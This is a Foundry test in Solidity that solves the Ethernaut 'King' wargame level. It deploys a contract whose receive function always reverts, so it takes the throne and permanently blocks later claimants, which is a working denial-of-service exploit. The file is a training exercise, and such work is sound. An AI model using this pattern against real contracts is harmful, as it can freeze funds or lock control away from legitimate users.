// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract MaliciousKing {
    constructor(address payable _target) payable {
        (bool success, ) = _target.call{value: msg.value}("");
        require(success, "Gagal jadi Raja");
    }

    receive() external payable {
        revert("SAYA TIDAK MAU UANG, SAYA MAU KUASA!");
    }
}

interface IEthernaut {
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address _instance) external;
}

contract EthernautKingTest is Test {
    IEthernaut ethernaut = IEthernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
    address levelFactory = 0x3049C00639E6dfC269ED1451764a046f7aE500c6;

    function testLevel9_King() public {

        address hacker = makeAddr("hacker");
        vm.deal(hacker, 1 ether);
        vm.startPrank(hacker);

        vm.recordLogs();
        ethernaut.createLevelInstance{value: 0.001 ether}(levelFactory);
        
        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 instanceTopic = entries[entries.length - 1].topics[2];
        address levelAddr = address(uint160(uint256(instanceTopic)));
        
        (bool success, bytes memory data) = levelAddr.staticcall(abi.encodeWithSignature("_king()"));
        address currentKing = abi.decode(data, (address));
        console.log("Raja Awal:", currentKing);

        (success, data) = levelAddr.staticcall(abi.encodeWithSignature("prize()"));
        uint256 currentPrize = abi.decode(data, (uint256));
        console.log("Harga Takhta:", currentPrize);

        console.log("Meluncurkan Raja Jahat...");
        
        new MaliciousKing{value: currentPrize + 1 wei}(payable(levelAddr));

        (success, data) = levelAddr.staticcall(abi.encodeWithSignature("_king()"));
        address newKing = abi.decode(data, (address));
        console.log("Raja Baru (Hacker):", newKing);
        
        console.log("Mencoba menggulingkan Raja Jahat...");
        address innocentUser = makeAddr("innocent");
        vm.deal(innocentUser, 10 ether);
        
        vm.stopPrank();
        vm.startPrank(innocentUser); 

        (bool reclaimSuccess, ) = levelAddr.call{value: currentPrize + 1 ether}("");
        
        require(!reclaimSuccess, "HACK GAGAL! Orang lain masih bisa jadi raja.");
        console.log("HACK SUKSES! Takhta terkunci selamanya.");

        vm.stopPrank();
        vm.startPrank(hacker);
        ethernaut.submitLevelInstance(levelAddr);
        vm.stopPrank();
    }
}